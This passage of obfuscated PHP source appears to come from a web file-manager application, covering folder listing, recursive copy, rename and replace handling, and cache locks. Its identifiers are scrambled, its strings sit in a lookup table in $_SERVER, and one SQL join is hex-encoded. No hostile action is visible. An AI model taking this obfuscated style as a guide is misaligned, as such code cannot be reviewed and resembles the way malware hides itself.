$this->metaSet($æ§¢Ô[$ı¦œ­Ú·[193]], $ı¦œ­Ú·[622], null); unset($æ§¢Ô[$ı¦œ­Ú·[550]][$ı¦œ­Ú·[623]]); continue; } $úš·÷ = $æ§¢Ô[$ı¦œ­Ú·[550]][$ı¦œ­Ú·[623]]; $æ§¢Ô[$ı¦œ­Ú·[550]][$ı¦œ­Ú·[624]] = Model($ı¦œ­Ú·[608])->getInfoSimpleOuter($úš·÷); } } unset($æ§¢Ô); } public function parentLevelArray($ñµÏ¡êî) { $¿¸È¤°ı =& $_SERVER[±³—úê]; $ñµÏ¡êî = explode($¿¸È¤°ı[50], trim($ñµÏ¡êî, $¿¸È¤°ı[50])); return array_remove_value($ñµÏ¡êî, $¿¸È¤°ı[240]); } public function listAll($‰­§Å¦­) { $µ±Íí² =& $_SERVER[±³—úê]; $àù¨›Áò = $this->sourceInfo($‰­§Å¦­); $£›ÇÊ«ï = array($µ±Íí²[625] => array($µ±Íí²[626], $àù¨›Áò[$µ±Íí²[595]] . $‰­§Å¦­ . $µ±Íí²[627]), $µ±Íí²[628] => 0); $è‹Ç¿™ = $µ±Íí²[629]; $ ´ËŸ€• = "\x4c\x45\106\124\x20\x4a\117\111\116\x20{$this->tablePrefix}\x69\157\137\146\x69\154\145\40\x66\151\154\x65\40\x6f\x6e\x20\x73\x6f\x75\x72\143\145\56\x66\151\154\145\111\x44\x20\75\x20\x66\151\x6c\145\56\x66\151\x6c\145\x49\x44"; $ùåô¼Ü = $this->alias($µ±Íí²[530])->field($è‹Ç¿™)->where($£›ÇÊ«ï)->join($ ´ËŸ€•)->select(); $this->_listAppendAuth($ùåô¼Ü); $this->_listAppendUser($ùåô¼Ü); $this->_listAppendPath($ùåô¼Ü); $ùåô¼Ü = array_to_keyvalue($ùåô¼Ü, $µ±Íí²[193]); $ıêÛæğ³ = "\x2f{$àù¨›Áò[$µ±Íí²[32]]}\x2f"; $ıêÛæğ³ = $ıêÛæğ³ == $µ±Íí²[266] ? $µ±Íí²[8] : $ıêÛæğ³; $ùå¸¸½ = array(); foreach ($ùåô¼Ü as $¶È‰ó¡ä => $áÔ¢®…Ç) { $Ò¹ªú¨ = $this->parentLevelArray($áÔ¢®…Ç[$µ±Íí²[595]]); array_shift($Ò¹ªú¨); $©‚í³¢ = $ıêÛæğ³; for ($íèöí…— = 0; $íèöí…— < count($Ò¹ªú¨); $íèöí…—++) { $©‚í³¢ .= $ùåô¼Ü[$Ò¹ªú¨[$íèöí…—]][$µ±Íí²[32]] . $µ±Íí²[8]; } $©‚í³¢ .= $áÔ¢®…Ç[$µ±Íí²[32]]; if ($áÔ¢®…Ç[$µ±Íí²[496]]) { $©‚í³¢ .= $µ±Íí²[8]; } $ØŸ‹åïğ = array($µ±Íí²[506] => str_replace($µ±Íí²[266], $µ±Íí²[8], str_replace($µ±Íí²[266], $µ±Íí²[8], str_replace($µ±Íí²[266], $µ±Íí²[8], $©‚í³¢))), $µ±Íí²[630] => intval($áÔ¢®…Ç[$µ±Íí²[496]]), $µ±Íí²[631] => intval($áÔ¢®…Ç[$µ±Íí²[79]]), $µ±Íí²[88] => intval($áÔ¢®…Ç[$µ±Íí²[88]]), $µ±Íí²[90] => $this->pathInfoFilter($áÔ¢®…Ç)); if (!$ØŸ‹åïğ[$µ±Íí²[496]]) { $ØŸ‹åïğ[$µ±Íí²[552]] = $áÔ¢®…Ç[$µ±Íí²[552]]; } $ùå¸¸½[] = $ØŸ‹åïğ; } $ùå¸¸½ = array_sort_by($ùå¸¸½, $µ±Íí²[87]); return $ùå¸¸½; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($¹©¶Š¦) { $ÜÓ€ã  =& $_SERVER[±³—úê]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÜÓ€ã [632], $¹©¶Š¦); $ÑéÉî˜ì = 1; $this->_lockEvent($¹©¶Š¦, array($ÜÓ€ã [633], $ÜÓ€ã [634]), $ÑéÉî˜ì); $this->_lockParent($¹©¶Š¦, array($ÜÓ€ã [634]), $ÑéÉî˜ì); $this->_lockEvent($¹©¶Š¦, array($ÜÓ€ã [635], $ÜÓ€ã [636]), $ÑéÉî˜ì); $this->_lockCheckEnd($ÜÓ€ã [632], $¹©¶Š¦); } public function lockCopyEnd($¿„Øëêã) { $‰¸âÙ =& $_SERVER[±³—úê]; if (!$this->allowLock()) { return; } $¼ßÑ¿á¨ = 0; $this->_lockEvent($¿„Øëêã, array($‰¸âÙ[633], $‰¸âÙ[634]), $¼ßÑ¿á¨); $this->_lockParent($¿„Øëêã, array($‰¸âÙ[634]), $¼ßÑ¿á¨); $this->_lockEvent($¿„Øëêã, array($‰¸âÙ[635], $‰¸âÙ[636]), $¼ßÑ¿á¨); } public function lockWriteStart($•“³ù…ı, $§×êóÕ¨ = '') { $û‹ê¦Ö =& $_SERVER[±³—úê]; if (!$this->allowLock()) { return; } $this->_lockCheck($û‹ê¦Ö[633], $•“³ù…ı); $«ÂêÈıÈ = 1; $this->_lockKey($û‹ê¦Ö[637] . $•“³ù…ı . $û‹ê¦Ö[10] . $§×êóÕ¨, $«ÂêÈıÈ); $this->_lockEvent($•“³ù…ı, array($û‹ê¦Ö[632], $û‹ê¦Ö[634]), $«ÂêÈıÈ); $this->_lockParent($•“³ù…ı, array($û‹ê¦Ö[632], $û‹ê¦Ö[634]), $«ÂêÈıÈ); $this->_lockCheckEnd($û‹ê¦Ö[633], $•“³ù…ı); } public function lockWriteEnd($Šßş±œ», $ªÄŸÔªá = '') { $â¶Å„¿– =& $_SERVER[±³—úê]; if (!$this->allowLock()) { return; } $¡âìÏ–û = 0; $this->_lockKey($â¶Å„¿–[637] . $Šßş±œ» . $â¶Å„¿–[10] . $ªÄŸÔªá, $¡âìÏ–û); $this->_lockEvent($Šßş±œ», array($â¶Å„¿–[632], $â¶Å„¿–[634]), $¡âìÏ–û); $this->_lockParent($Šßş±œ», array($â¶Å„¿–[632], $â¶Å„¿–[634]), $¡âìÏ–û); } public function lockMoveStart($äË”Òœ«) { $¡ŒÛùÒ— =& $_SERVER[±³—úê]; if (!$this->allowLock()) { return; } $this->_lockCheck($¡ŒÛùÒ—[634], $äË”Òœ«); $º…º¯¨¢ = 1; $this->_lockKey($¡ŒÛùÒ—[638] . $äË”Òœ«, $º…º¯¨¢); $this->_lockEvent($äË”Òœ«, array($¡ŒÛùÒ—[632], $¡ŒÛùÒ—[633]), $º…º¯¨¢); $this->_lockParent($äË”Òœ«, array($¡ŒÛùÒ—[632], $¡ŒÛùÒ—[634]), $º…º¯¨¢); $this->_lockEvent($äË”Òœ«, array($¡ŒÛùÒ—[639], $¡ŒÛùÒ—[635], $¡ŒÛùÒ—[636]), $º…º¯¨¢); $this->_lockCheckEnd($¡ŒÛùÒ—[634], $äË”Òœ«); } public function lockMoveEnd($¢ôÁñå) { $ö¡ìó„† =& $_SERVER[±³—úê]; if (!$this->allowLock()) { return; } $Ÿ¹Ñ³–å = 0; $this->_lockKey($ö¡ìó„†[638] . $¢ôÁñå, $Ÿ¹Ñ³–å); $this->_lockEvent($¢ôÁñå, array($ö¡ìó„†[632], $ö¡ìó„†[633]), $Ÿ¹Ñ³–å); $this->_lockParent($¢ôÁñå, array($ö¡ìó„†[632], $ö¡ìó„†[634]), $Ÿ¹Ñ³–å); $this->_lockEvent($¢ôÁñå, array($ö¡ìó„†[639], $ö¡ìó„†[635], $ö¡ìó„†[636]), $Ÿ¹Ñ³–å); } private function _lockCheck($àÉ¾şö€, $¡ÙôµĞ‡) { $”’¶•î =& $_SERVER[±³—úê]; $¨ÇØ¹æ¨ = $this->sourceInfo($¡ÙôµĞ‡); $ú²øí¦â = $àÉ¾şö€ . $”’¶•î[10] . $¡ÙôµĞ‡; $this->_lockTimeStart[$ú²øí¦â] = timeFloat(); if (!is_array($¨ÇØ¹æ¨)) { return; } $‘±Òµ¯ = LNG($”’¶•î[640]); CacheLock::setErrorMsg($”’¶•î[176] . htmlspecialchars($¨ÇØ¹æ¨[$”’¶•î[32]]) . $”’¶•î[178] . $‘±Òµ¯); $this->_lockKey($ú²øí¦â, 1); $this->_lockKey($ú²øí¦â, 0); $‹µ‰åş = array_reverse($this->parentLevelArray($¨ÇØ¹æ¨[$”’¶•î[595]])); foreach ($‹µ‰åş as $ş€çŒ¶·) { $ú²øí¦â = $àÉ¾şö€ . $”’¶•î[641] . $ş€çŒ¶·; if (CacheLock::lockGet($”’¶•î[642] . $ú²øí¦â)) { $¨ÇØ¹æ¨ = $this->sourceInfo($ş€çŒ¶·); CacheLock::setErrorMsg($”’¶•î[176] . htmlspecialchars($¨ÇØ¹æ¨[$”’¶•î[32]]) . $”’¶•î[178] . $‘±Òµ¯); $this->_lockKey($ú²øí¦â, 1); $this->_lockKey($ú²øí¦â, 0); } } } private function _lockCheckEnd($æß»““Î, $åô£Öìº) { $°Ë§ÙäÊ =& $_SERVER[±³—úê]; $†”¡è²ä = $æß»““Î . $°Ë§ÙäÊ[10] . $åô£Öìº; CacheLock::setErrorMsg($°Ë§ÙäÊ[465]); if (!isset($this->_lockTimeStart[$†”¡è²ä])) { return; } $ıÒŸåê  = timeFloat() - $this->_lockTimeStart[$†”¡è²ä]; unset($this->_lockTimeStart[$†”¡è²ä]); if ($ıÒŸåê  > 0.5) { unset(self::$cacheSourceInfo[$°Ë§ÙäÊ[544] . $åô£Öìº]); } $È‚¹È¡Ñ = $this->sourceInfo($åô£Öìº); if (!$È‚¹È¡Ñ) { show_json(LNG($°Ë§ÙäÊ[108]), !1); } } private function _lockParent($¹òúÃğ¯, $êî‘¶™’, $Òñ Ùå) { if (!$this->autoLockSet) { return; } $¾æ®— = $this->sourceInfo($¹òúÃğ¯); if (!is_array($¾æ®—)) { return; } $§ĞİĞ¯• = array_reverse($this->parentLevelArray($¾æ®—[$_SERVER[±³—úê][595]])); foreach ($§ĞİĞ¯• as $‡²É¶Ú) { $this->_lockEvent($‡²É¶Ú, $êî‘¶™’, $Òñ Ùå); } } private function _lockEvent($õ—Ô…¹­, $†Õ½íì, $¿¼ÙÉ”¤) { $ªû‚¶ =& $_SERVER[±³—úê]; if (!$this->autoLockSet) { return; } foreach ($†Õ½íì as $õ µòï) { $‚µ‡¨Ã¶ = $õ µòï . $ªû‚¶[10] . $õ—Ô…¹­; if ($¿¼ÙÉ”¤ && CacheLock::lockGet($ªû‚¶[642] . $‚µ‡¨Ã¶)) { continue; } $this->_lockKey($‚µ‡¨Ã¶, $¿¼ÙÉ”¤); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($å¡ÁãÇÏ, $˜¥ªö¨ = 1) { $¼™úĞ = $_SERVER[±³—úê][642] . md5($å¡ÁãÇÏ); if ($˜¥ªö¨) { if (isset(self::$_lockItemArr[$¼™úĞ])) { return; } self::$_lockItemArr[$¼™úĞ] = 1; CacheLock::lock($¼™úĞ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¼™úĞ])) { return; } unset(self::$_lockItemArr[$¼™úĞ]); CacheLock::unlock($¼™úĞ); } } public function isParentOf($‚ªØƒÊÏ, $¥Éáš€ˆ) { $œñéÄİÑ =& $_SERVER[±³—úê]; $“¤îñş‡ = $this->sourceInfo($‚ªØƒÊÏ); $¤Ò¤Õä† = $this->sourceInfo($¥Éáš€ˆ); $úÍ›÷›Ÿ = $“¤îñş‡[$œñéÄİÑ[595]] . $“¤îñş‡[$œñéÄİÑ[193]] . $œñéÄİÑ[50]; $í¿é³ÕÊ = $¤Ò¤Õä†[$œñéÄİÑ[595]] . $¤Ò¤Õä†[$œñéÄİÑ[193]] . $œñéÄİÑ[50]; $õÂˆÒã = strpos($í¿é³ÕÊ, $úÍ›÷›Ÿ) === 0; return $õÂˆÒã; } private $targetIsDelete = 0; public function copy($Íà™³šË, $Ã‹Û ò, $Ù¡»¹ƒ­ = REPEAT_REPLACE, $™£›°âÒ = '') { $—ÈË¡ÉÆ =& $_SERVER[±³—úê]; $Ò´†ĞıÌ = $this->sourceInfo($Íà™³šË); $å—‡–ôô = $this->sourceInfo($Ã‹Û ò); if (!$Ò´†ĞıÌ || !$å—‡–ôô || $å—‡–ôô[$—ÈË¡ÉÆ[496]] != $—ÈË¡ÉÆ[91]) { return !1; } if ($this->isParentOf($Íà™³šË, $Ã‹Û ò)) { return !1; } $è—ÑßØÆ = $™£›°âÒ ? $™£›°âÒ : $Ò´†ĞıÌ[$—ÈË¡ÉÆ[32]]; $this->lockCopyStart($Íà™³šË); $this->lockWriteStart($Ã‹Û ò, $è—ÑßØÆ); $±Ú­ê× = array($—ÈË¡ÉÆ[643] => array(), $—ÈË¡ÉÆ[644] => array(), $—ÈË¡ÉÆ[645] => array()); $this->targetIsDelete = intval($Ò´†ĞıÌ[$—ÈË¡ÉÆ[516]]); $Óµ¯è±É = $this->fileNameExistAuto($Ã‹Û ò, $Ò´†ĞıÌ); $Âëªçèë = $this->_copy($Íà™³šË, $Ã‹Û ò, $Ù¡»¹ƒ­, $±Ú­ê×, !0, $™£›°âÒ); $this->_childrenListClear(); $this->lockCopyEnd($Íà™³šË); $this->lockWriteEnd($Ã‹Û ò, $è—ÑßØÆ); if ($Ò´†ĞıÌ[$—ÈË¡ÉÆ[496]] == $—ÈË¡ÉÆ[91] && $Óµ¯è±É == $Âëªçèë) { $this->folderSizeResetChildren($Óµ¯è±É); } Model($—ÈË¡ÉÆ[646])->addAll($±Ú­ê×[$—ÈË¡ÉÆ[644]], array(), !0); if ($Óµ¯è±É != $Âëªçèë || $Ò´†ĞıÌ[$—ÈË¡ÉÆ[496]] == $—ÈË¡ÉÆ[91]) { Model($—ÈË¡ÉÆ[647])->eventCopy($Âëªçèë); } $this->saveAll($±Ú­ê×[$—ÈË¡ÉÆ[645]]); Model($—ÈË¡ÉÆ[242])->linkAdd($±Ú­ê×[$—ÈË¡ÉÆ[643]]); $this->folderSizeReset($Ã‹Û ò); $this->updateModifyTime($Ã‹Û ò); return $Âëªçèë; } private function _copy($Ÿ¿—ÅÖ, $¥ßÙ–¿, $£ù¦íŒ, &$¸Ê„ÖëÈ, $¤Ÿí´•ğ, $öŞøš®€ = '') { $ˆæåãŞÇ =& $_SERVER[±³—úê]; $ë¿‹åßü = $this->sourceInfoCache($Ÿ¿—ÅÖ); $èâìù¯ç = $ë¿‹åßü[$ˆæåãŞÇ[496]] == $ˆæåãŞÇ[91]; $é­Ãáïø = $öŞøš®€ ? $öŞøš®€ : $ë¿‹åßü[$ˆæåãŞÇ[32]]; $‘ß¾ÛœÆ = $this->fileNameExistAuto($¥ßÙ–¿, $ë¿‹åßü); if ($¤Ÿí´•ğ) { $this->_childrenAllMake($Ÿ¿—ÅÖ); if ($èâìù¯ç && $‘ß¾ÛœÆ) { $this->_childrenAllMake($‘ß¾ÛœÆ); } } if (!$‘ß¾ÛœÆ) { return $this->_copyCreate($Ÿ¿—ÅÖ, $¥ßÙ–¿, $é­Ãáïø, $¸Ê„ÖëÈ); } $Ğª·×Üş = $‘ß¾ÛœÆ; if ($èâìù¯ç) { if ($£ù¦íŒ == REPEAT_RENAME_FOLDER) { $é­Ãáïø = $this->fileNameAutoCache($¥ßÙ–¿, $é­Ãáïø, $£ù¦íŒ, $èâìù¯ç); $Ğª·×Üş = $this->_copyCreate($Ÿ¿—ÅÖ, $¥ßÙ–¿, $é­Ãáïø, $¸Ê„ÖëÈ); } else { $¹›Òüœ = $this->_childrenList($Ÿ¿—ÅÖ); foreach ($¹›Òüœ as $¥øØà¸ê) { $this->_copy($¥øØà¸ê[$ˆæåãŞÇ[193]], $‘ß¾ÛœÆ, $£ù¦íŒ, $¸Ê„ÖëÈ, !1); } } } else { if ($£ù¦íŒ == REPEAT_RENAME || $£ù¦íŒ == REPEAT_RENAME_FOLDER) { $é­Ãáïø = $this->fileNameAutoCache($¥ßÙ–¿, $é­Ãáïø, $£ù¦íŒ, $èâìù¯ç); $Ğª·×Üş = $this->_copyCreate($Ÿ¿—ÅÖ, $¥ßÙ–¿, $é­Ãáïø, $¸Ê„ÖëÈ); } else { if ($£ù¦íŒ == REPEAT_REPLACE) { $Ğ§»´µ = $this->sourceInfoCache($‘ß¾ÛœÆ); $Å Áï› = $this->fileHistory($Ğ§»´µ, $ë¿‹åßü[$ˆæåãŞÇ[552]], $ë¿‹åßü[$ˆæåãŞÇ[79]]); if ($Å Áï›) { $¸Ê„ÖëÈ[$ˆæåãŞÇ[643]][] = $ë¿‹åßü[$ˆæåãŞÇ[552]]; } } else { if ($£ù¦íŒ == REPEAT_SKIP) { } } } Hook::trigger($ˆæåãŞÇ[648], array($ˆæåãŞÇ[649], $ë¿‹åßü, 0)); } return $Ğª·×Üş; } private function _copyCreate($Ä¹åûÌ­, $Õ‹—´‚, $ûåâ§âó, &$ÈèäõÌç) { $ÎŒ‡òñæ =& $_SERVER[±³—úê]; $åˆÄãÛ› = $this->sourceInfoCache($Ä¹åûÌ­); $úÒÇ«™À = $this->sourceInfoCache($Õ‹—´‚); $¯Å‘Š°û = $this->_makeItemData($åˆÄãÛ›, $úÒÇ«™À, $ûåâ§âó); Hook::trigger($ÎŒ‡òñæ[650], $¯Å‘Š°û); Hook::trigger($ÎŒ‡òñæ[651], array($ÎŒ‡òñæ[652], $¯Å‘Š°û, 0)); $€•áãÖµ = $this->add($¯Å‘Š°û); $şã±êÄÎ = array($ÎŒ‡òñæ[193] => $€•áãÖµ, $ÎŒ‡òñæ[32] => $ûåâ§âó); $this->_copyApplyMeta($şã±êÄÎ, $ÈèäõÌç); if ($åˆÄãÛ›[$ÎŒ‡òñæ[496]] != $ÎŒ‡òñæ[91]) { $ÈèäõÌç[$ÎŒ‡òñæ[643]][] = $åˆÄãÛ›[$ÎŒ‡òñæ[552]]; return $€•áãÖµ; } $Œ¸¾Êµ = array(); $Ë«İˆ¢ò = array(); $this->_childrenListAll($Ä¹åûÌ­, $Œ¸¾Êµ); $ã¿¦¡åØ = count($Œ¸¾Êµ); if ($ã¿¦¡åØ == 0) { return $€•áãÖµ; } $¦Ä’÷Â = $this->sourceInfo($€•áãÖµ); foreach ($Œ¸¾Êµ as $Çşó©ü²) { $ÏÕ ›Çƒ = $this->_makeItemData($Çşó©ü², $¦Ä’÷Â, $Çşó©ü²[$ÎŒ‡òñæ[32]]); $ÏÕ ›Çƒ[$ÎŒ‡òñæ[595]] = $Çşó©ü²[$ÎŒ‡òñæ[595]]; $Ë«İˆ¢ò[] = $ÏÕ ›Çƒ; } $this->chunkEventSet($ÎŒ‡òñæ[653], array($ÎŒ‡òñæ[654], $¯Å‘Š°û, $ã¿¦¡åØ)); $this->addAll($Ë«İˆ¢ò, array(), !1); $Üı¨Ç¼å = $this->where(array($ÎŒ‡òñæ[192] => $€•áãÖµ))->select(); $ïğ¯šé = $this->_childrenMakeRelation($Œ¸¾Êµ, $Üı¨Ç¼å); $ïğ¯šé[$Ä¹åûÌ­] = $€•áãÖµ; $±á´õ¼ = array(); $úóä£™Š = array(); foreach ($Üı¨Ç¼å as $Çşó©ü²) { $İ×§™¢Ç = $Çşó©ü²[$ÎŒ‡òñæ[193]]; $ßı»ÖÄï = $this->_childrenMatch($ïğ¯šé, $Çşó©ü², $¦Ä’÷Â); $±á´õ¼[] = array($ÎŒ‡òñæ[193], $İ×§™¢Ç, $ÎŒ‡òñæ[192], $ßı»ÖÄï[$ÎŒ‡òñæ[192]]); $úóä£™Š[] = array($ÎŒ‡òñæ[193], $İ×§™¢Ç, $ÎŒ‡òñæ[595], $ßı»ÖÄï[$ÎŒ‡òñæ[595]]); $this->_copyApplyMeta($Çşó©ü², $ÈèäõÌç); if ($Çşó©ü²[$ÎŒ‡òñæ[496]] != $ÎŒ‡òñæ[91]) { $ÈèäõÌç[$ÎŒ‡òñæ[643]][] = $Çşó©ü²[$ÎŒ‡òñæ[552]]; } } $this->chunkEventSet($ÎŒ‡òñæ[655], array($ÎŒ‡òñæ[656], $¯Å‘Š°û, $ã¿¦¡åØ)); $this->saveAll($±á´õ¼); $this->chunkEventSet($ÎŒ‡òñæ[657], array($ÎŒ‡òñæ[658], $¯Å‘Š°û, $ã¿¦¡åØ)); $this->saveAll($úóä£™Š); return $€•áãÖµ; } private function _childrenMakeRelation($×¿şôˆî, $í‘Ô®ş) { $ïƒ®×İ =& $_SERVER[±³—úê]; $–”åªÊ« = array(); $Í×Æ¿õØ = array(); foreach ($×¿şôˆî as $äÀÌ¦) { $Éºà‡™¯ = $äÀÌ¦[$ïƒ®×İ[32]] . $ïƒ®×İ[8] . $äÀÌ¦[$ïƒ®×İ[595]]; $–”åªÊ«[$Éºà‡™¯] = $äÀÌ¦[$ïƒ®×İ[193]]; } foreach ($í‘Ô®ş as $äÀÌ¦) { $Éºà‡™¯ = $äÀÌ¦[$ïƒ®×İ[32]] . $ïƒ®×İ[8] . $äÀÌ¦[$ïƒ®×İ[595]]; $³¯º» = $–”åªÊ«[$Éºà‡™¯]; $Í×Æ¿õØ[$³¯º»] = $äÀÌ¦[$ïƒ®×İ[193]]; } return $Í×Æ¿õØ; } private function _childrenMatch($ÕÒº¼ù, $´ôÖ‡‹, $â Î’ñ¿) { $‹Ô¦Ó =& $_SERVER[±³—úê]; $×ì“‹Á = $â Î’ñ¿[$‹Ô¦Ó[595]]; $½¼ÏÖ‹ß = $this->parentLevelArray($´ôÖ‡‹[$‹Ô¦Ó[595]]); foreach ($½¼ÏÖ‹ß as $§àÜ»¾†) { if (isset($ÕÒº¼ù[$§àÜ»¾†])) { $×ì“‹Á .= $ÕÒº¼ù[$§àÜ»¾†] . $‹Ô¦Ó[659]; } } $×ì“‹Á = rtrim($×ì“‹Á, $‹Ô¦Ó[50]) . $‹Ô¦Ó[50]; $ìĞ•íüÆ = $this->parentLevelArray($×ì“‹Á); $­ªˆª´‘ = $ìĞ•íüÆ[count($ìĞ•íüÆ) - 1]; return array($‹Ô¦Ó[192] => $­ªˆª´‘, $‹Ô¦Ó[595] => $×ì“‹Á); } private function _makeItemData($‚Êü”è®, $¿Á€‰Ö, $‚ÖÅïü) { $ñÈéï¼¾ =& $_SERVER[±³—úê]; $êÓ¥ÌÊ = array($ñÈéï¼¾[660] => $‚Êü”è®[$ñÈéï¼¾[496]], $ñÈéï¼¾[505] => $‚ÖÅïü, $ñÈéï¼¾[661] => $‚Êü”è®[$ñÈéï¼¾[497]] ? $‚Êü”è®[$ñÈéï¼¾[497]] : $ñÈéï¼¾[12], $ñÈéï¼¾[553] => $‚Êü”è®[$ñÈéï¼¾[552]] ? $‚Êü”è®[$ñÈéï¼¾[552]] : 0, $ñÈéï¼¾[631] => $‚Êü”è®[$ñÈéï¼¾[79]] ? $‚Êü”è®[$ñÈéï¼¾[79]] : 0, $ñÈéï¼¾[662] => intval($¿Á€‰Ö[$ñÈéï¼¾[190]]), $ñÈéï¼¾[663] => intval($¿Á€‰Ö[$ñÈéï¼¾[580]]), $ñÈéï¼¾[664] => intval(USER_ID), $ñÈéï¼¾[665] => intval(USER_ID), $ñÈéï¼¾[488] => intval($¿Á€‰Ö[$ñÈéï¼¾[193]]), $ñÈéï¼¾[666] => $¿Á€‰Ö[$ñÈéï¼¾[595]] . $¿Á€‰Ö[$ñÈéï¼¾[193]] . $ñÈéï¼¾[50], $ñÈéï¼¾[509] => $‚Êü”è®[$ñÈéï¼¾[88]] ? $‚Êü”è®[$ñÈéï¼¾[88]] : time(), $ñÈéï¼¾[515] => 0, $ñÈéï¼¾[667] => $ñÈéï¼¾[12]); return $êÓ¥ÌÊ; } private function _copyApplyMeta($€ÔˆŞ , &$ëèº¥÷) { $ï¨‘¬Š× =& $_SERVER[±³—úê]; $öµ›îòø = $€ÔˆŞ [$ï¨‘¬Š×[193]]; $šä†‰ãï = $€ÔˆŞ [$ï¨‘¬Š×[32]]; if (!isset($€ÔˆŞ [$ï¨‘¬Š×[668]]) || !$€ÔˆŞ [$ï¨‘¬Š×[668]] || $€ÔˆŞ [$ï¨‘¬Š×[668]] == $ï¨‘¬Š×[240]) { $ëèº¥÷[$ï¨‘¬Š×[645]][] = array($ï¨‘¬Š×[193], $öµ›îòø, $ï¨‘¬Š×[668], short_id($öµ›îòø)); } if (Input::check($šä†‰ãï, $ï¨‘¬Š×[669])) { $ëèº¥÷[$ï¨‘¬Š×[644]][] = array($ï¨‘¬Š×[193] => $öµ›îòø, $ï¨‘¬Š×[97] => $ï¨‘¬Š×[549], $ï¨‘¬Š×[461] => str_replace($ï¨‘¬Š×[53], $ï¨‘¬Š×[12], Pinyin::get($šä†‰ãï))); $ëèº¥÷[$ï¨‘¬Š×[644]][] = array($ï¨‘¬Š×[193] => $öµ›îòø, $ï¨‘¬Š×[97] => $ï¨‘¬Š×[548], $ï¨‘¬Š×[461] => Pinyin::get($šä†‰ãï, $ï¨‘¬Š×[670])); } $ëèº¥÷[$ï¨‘¬Š×[644]][] = array($ï¨‘¬Š×[193] => $öµ›îòø, $ï¨‘¬Š×[97] => $ï¨‘¬Š×[528], $ï¨‘¬Š×[461] => KodSort::makeStr($šä†‰ãï)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Ä‚é¹¶—) { $¸ò»’¥ =& $_SERVER[±³—úê]; $©ÓŒ½˜á = $this->sourceInfo($Ä‚é¹¶—); $ìš¡æ¶„ = $¸ò»’¥[671]; $´›ßñÕ = array($¸ò»’¥[595] => array($¸ò»’¥[626], $©ÓŒ½˜á[$¸ò»’¥[595]] . $Ä‚é¹¶— . $¸ò»’¥[627]), $¸ò»’¥[516] => $this->targetIsDelete); $É•›…è‰ = $this->field($ìš¡æ¶„)->where($´›ßñÕ)->select(); if (!$É•›…è‰) { return; } $É•›…è‰ = array_to_keyvalue($É•›…è‰, $¸ò»’¥[193]); foreach ($É•›…è‰ as $Ÿ´ÃÑ±À) { $‘İşäÀı = $Ÿ´ÃÑ±À[$¸ò»’¥[192]]; $Ä‚é¹¶— = $Ÿ´ÃÑ±À[$¸ò»’¥[193]]; if (!isset($this->_childrenListCache[$Ä‚é¹¶—]) && $Ÿ´ÃÑ±À[$¸ò»’¥[496]] == $¸ò»’¥[91]) { $this->_childrenListCache[$Ä‚é¹¶—] = array(); } if (!isset($this->_childrenListCache[$‘İşäÀı])) { $this->_childrenListCache[$‘İşäÀı] = array(); } $this->_childrenListCache[$‘İşäÀı][$Ä‚é¹¶—] = $Ÿ´ÃÑ±À; $this->_childrenItemCache[$Ä‚é¹¶—] = $Ÿ´ÃÑ±À; } } private function _childrenListAll($Â­æ’ëŒ, &$¿½»£¥¹) { $ğ¤‡¹™ =& $_SERVER[±³—úê]; if (!isset($this->_childrenListCache[$Â­æ’ëŒ])) { return; } $Š üòÛÓ = $this->_childrenListCache[$Â­æ’ëŒ]; foreach ($Š üòÛÓ as $²éÄüÙÜ => $øĞÕåï©) { $¿½»£¥¹[$²éÄüÙÜ] = $øĞÕåï©; if ($øĞÕåï©[$ğ¤‡¹™[496]] == $ğ¤‡¹™[91]) { $this->_childrenListAll($²éÄüÙÜ, $¿½»£¥¹); } } } private function sourceInfoCache($‹Ê°ˆ½ı) { if (isset($this->_childrenItemCache[$‹Ê°ˆ½ı])) { return $this->_childrenItemCache[$‹Ê°ˆ½ı]; } return $this->sourceInfo($‹Ê°ˆ½ı); } private function _childrenList($úñÇ×áË) { if (isset($this->_childrenListCache[$úñÇ×áË])) { return $this->_childrenListCache[$úñÇ×áË]; } return $this->_childrenListSelect($úñÇ×áË); } private function _childrenListSelect($Ô¬²ÅÀÂ) { $ºÉ±…Î£ =& $_SERVER[±³—úê]; $’Š×ï¶İ = array($ºÉ±…Î£[192] => $Ô¬²ÅÀÂ, $ºÉ±…Î£[516] => $this->targetIsDelete); $¹¼–ï‘³ = $this->where($’Š×ï¶İ)->select(); $¹¼–ï‘³ = $¹¼–ï‘³ ? $¹¼–ï‘³ : array(); $¦ôŸøô = array_to_keyvalue($¹¼–ï‘³, $ºÉ±…Î£[193]); $this->_childrenListCache[$Ô¬²ÅÀÂ] = $¦ôŸøô; foreach ($¦ôŸøô as $Ô¬²ÅÀÂ => $º ©ˆ–Œ) { $this->_childrenItemCache[$Ô¬²ÅÀÂ] = $º ©ˆ–Œ; } return $¦ôŸøô; } private function fileNameExistAuto($Šûµğ­ß, $ö³ÆƒôË) { $Úï³šò =& $_SERVER[±³—úê]; if ($ö³ÆƒôË[$Úï³šò[516]] == $Úï³šò[91]) { return $this->fileNameExist($Šûµğ­ß, $ö³ÆƒôË[$Úï³šò[32]]); } return $this->fileNameExistCache($Šûµğ­ß, $ö³ÆƒôË[$Úï³šò[32]]); } private function fileNameExistCache($Ì×ÍÅÖ¸, $ò‡¨§Å‰) { $ğ”±‡‰ =& $_SERVER[±³—úê]; $ò‡¨§Å‰ = strtolower($ò‡¨§Å‰); $™öĞ¡‚ = $this->_childrenList($Ì×ÍÅÖ¸); foreach ($™öĞ¡‚ as $ˆ—´Æ½´) { if ($ò‡¨§Å‰ == strtolower($ˆ—´Æ½´[$ğ”±‡‰[32]])) { return $ˆ—´Æ½´[$ğ”±‡‰[193]]; } } return !1; } private function fileNameAutoCache($¯÷á½è¯, $â”ñØÚ•, $àØ¥âÎœ, $…¡ÊşÕ) { $¤ôµÒÔÁ =& $_SERVER[±³—úê]; $ÚÅ²§Ÿ = $this->_childrenList($¯÷á½è¯); $İ¨‚ıãÇ = array_to_keyvalue($ÚÅ²§Ÿ, $¤ôµÒÔÁ[12], $¤ôµÒÔÁ[32]); return $this->fileNameAutoGet($İ¨‚ıãÇ, $â”ñØÚ•, $àØ¥âÎœ, $…¡ÊşÕ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = 